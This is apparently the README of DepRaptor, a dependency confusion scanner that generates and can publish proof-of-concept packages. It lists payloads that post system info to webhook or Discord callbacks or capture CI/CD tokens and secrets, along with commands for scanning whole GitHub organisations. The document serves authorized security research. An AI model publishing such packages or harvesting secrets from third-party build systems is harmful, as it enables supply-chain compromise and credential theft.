<img width="1700" height="460" alt="github-header-banner (2)" src="https://github.com/user-attachments/assets/537fef11-f316-4cfd-9067-8113a4c211a7" />
# DepRaptor

> Dependency Confusion Vulnerability Scanner & PoC Framework

**Developer:** LAKSHMIKANTHAN K (letchupkt)  
**Version:** 2.0.0  
**License:** MIT

---

```
________                  __________                  __
\______ \    ____  ______ \______   \_____   ______ _/  |_  ____ _______
 |    |  \ _/ __ \ \____ \ |       _/\__  \  \____ \\   __\/  _ \\_  __ \
 |    `   \\  ___/ |  |_> >|    |   \ / __ \_|  |_> >|  | (  <_> )|  | \/
/_______  / \___  >|   __/ |____|_  /(____  /|   __/ |__|  \____/ |__|
        \/      \/ |__|           \/      \/ |__|

Dependency Confusion Scanner
Developer: LAKSHMIKANTHAN K (letchupkt)
```

---

## What is DepRaptor?

DepRaptor is a production-grade dependency confusion vulnerability scanner built for security researchers and bug bounty hunters. It detects packages vulnerable to dependency confusion attacks across multiple ecosystems, generates proof-of-concept packages with modular payloads, and produces detailed reports — all from a single CLI.

---

## Installation

```bash
pip install depraptor
```

---

## Quick Start

```bash
# Interactive mode — guided step-by-step workflow
depraptor scan ./my-project

# Scan with explicit payload and callback
depraptor scan ./my-project --payload webhook --callback https://webhook.site/xxx

# Scan a GitHub repo
depraptor scan https://github.com/org/repo

# Scan an entire GitHub org
depraptor scan org:stripe

# Scan from a list of repo URLs
depraptor scan list:repos.txt

# Scan from a list of local paths
depraptor scan paths:targets.txt

# Dry-run with autopublish (no actual upload)
depraptor scan ./my-project --autopublish --simulate

# Check environment
depraptor doctor
```

---

## CLI Reference

```
depraptor scan TARGET [OPTIONS]
```

| Flag | Short | Description |
|------|-------|-------------|
| `--payload` | `-p` | Payload type: `system_info` \| `webhook` \| `discord` \| `interactsh` \| `ci_env_dump` \| `custom` |
| `--callback` | `-c` | Callback URL for webhook/discord/interactsh payloads |
| `--threads` | `-t` | Registry check threads (default: 10) |
| `--output` | `-o` | Output directory (default: `./results`) |
| `--repo-dir` | | Directory for cloned repos (default: `./repos`) |
| `--autopublish` | | Publish PoC packages after generation (requires confirmation) |
| `--simulate` | | Dry-run — build PoCs but skip publishing |
| `--secrets` | | Run TruffleHog secret scan on the target |
| `--github-token` | | GitHub personal access token |
| `--verbose` | `-v` | Verbose logging to stderr |

---

## Interactive Mode

Running `depraptor scan <target>` with no payload flags enters interactive mode:

1. Scan dependencies and check registries
2. Display vulnerable packages
3. Prompt to choose PoC payload type
4. Prompt for callback URL (if needed)
5. Generate PoC packages
6. Ask if you want to publish (default: No)
7. Safety confirmation before any publish

---

## Payload Types

| Payload | Description |
|---------|-------------|
| `system_info` | Logs hostname, username, cwd, env vars to a local file |
| `webhook` | POSTs system info as JSON to an HTTP callback URL |
| `discord` | Sends a formatted message to a Discord webhook |
| `interactsh` | DNS/HTTP ping to an interact.sh OOB domain |
| `ci_env_dump` | Captures CI/CD tokens and secrets to a local file |
| `custom` | Stub for your own payload code |

---

## Target Modes

| Format | Example | Description |
|--------|---------|-------------|
| Local path | `./project` | Scan a local directory |
| GitHub URL | `https://github.com/org/repo` | Clone and scan a single repo |
| GitHub org | `org:stripe` | Scan all public repos in an org |
| Repo list | `list:repos.txt` | Scan repos from a URL list file |
| Path list | `paths:targets.txt` | Scan multiple local paths from a file |

---

## Output Structure

```
results/
├── report.json          # Full JSON report
├── report.md            # Markdown report
├── dependencies.json    # All parsed dependencies
├── logs/
│   └── scan.log
└── pocs/
    └── <package-name>/
        ├── payload.py
        ├── setup.py
        ├── pyproject.toml
        └── README.md
```

---

## Configuration File

Create `~/.depraptor/config.yaml` to set defaults:

```yaml
threads: 20
default_payload: webhook
simulate: false
npm_token: ""
pypi_token: ""
github_token: ""
verbose: false
```

CLI flags always override config file values.

---

## Risk Scoring

Each vulnerable package gets a risk score from 0–10:

| Factor | Score |
|--------|-------|
| Not in public registry | +5.0 |
| Internal naming pattern (`internal-`, `private-`, etc.) | +2.0 |
| CI/CD pipeline detected | +1.5 |
| Unpinned / wildcard version | +1.0 |
| Short package name | +0.5 |

---

## Supported Dependency Files

| Ecosystem | Files |
|-----------|-------|
| Python | `requirements*.txt`, `pyproject.toml`, `setup.py`, `Pipfile` |
| Node.js | `package.json` |
| Ruby | `Gemfile` |
| Go | `go.mod` |
| Rust | `Cargo.toml` |

---

## Security Notice

> This tool is intended **only** for authorized security testing, bug bounty programs with proper scope, and security research with explicit permission.

- Do NOT publish PoC packages to public registries without authorization
- Do NOT test systems you don't own or have written permission to test
- Always follow responsible disclosure practices

Unauthorized use may be illegal. The author is not responsible for misuse.

---

**Developer:** LAKSHMIKANTHAN K (letchupkt)
